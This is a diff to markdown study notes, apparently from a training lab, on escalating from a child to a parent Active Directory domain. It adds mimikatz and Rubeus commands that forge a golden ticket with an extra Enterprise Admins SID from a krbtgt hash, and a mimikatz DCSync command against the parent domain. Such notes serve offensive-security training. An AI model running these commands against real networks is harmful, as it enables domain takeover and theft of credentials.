@@ -83,11 +83,21 @@ Get-DomainSID
 ```powershell
 Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
 ```
-4) **Creating a Golden Ticket with Mimikatz**
+4) **Creating a Golden Ticket**
 ```powershell
+
+# mimikatz
 mimikatz.exe "kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt"
+
+# Rubeus
+.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
 ```
 5) **Confirming a Kerberos Ticket is in Memory**
 ```powershell
 klist
+```
+
+6) Performing a DCSync Attack against parent domain then we can forge golden ticket
+```
+.\mimikatz.exe "lsadump::dcsync" "/domain:INLANEFREIGHT.LOCAL" "/user:INLANEFREIGHT\lab_adm"
 ```
